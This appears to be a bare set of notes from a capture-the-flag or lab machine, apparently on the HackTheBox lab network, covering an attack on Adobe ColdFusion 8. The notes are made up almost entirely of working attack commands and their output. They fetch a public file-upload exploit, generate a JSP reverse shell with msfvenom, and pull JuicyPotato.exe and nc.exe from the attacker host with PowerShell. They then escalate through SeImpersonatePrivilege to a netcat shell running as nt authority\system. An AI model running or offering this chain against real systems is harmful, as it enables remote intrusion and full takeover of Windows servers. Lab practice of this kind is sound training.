```
cold fusion 8 exploit

wget https://raw.githubusercontent.com/nipunsomani/Adobe-ColdFusion-8-File-Upload-Exploit/main/exploit.py

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.17 LPORT=4567 -o rev.jsp  

python2 exploit.py 10.10.10.11 8500 rev.jsp

whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


powershell -c "$client = New-Object Net.WebClient; $client.DownloadFile('http://10.10.14.17:8000/JuicyPotato.exe', 'jp.exe')"

powershell -c "$client = New-Object Net.WebClient; $client.DownloadFile('http://10.10.14.17:8000/nc.exe', 'nc.exe')"

jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\tolis\desktop\nc.exe -e cmd.exe 10.10.14.17 1234" -t *

whoami
nt authority\system

```
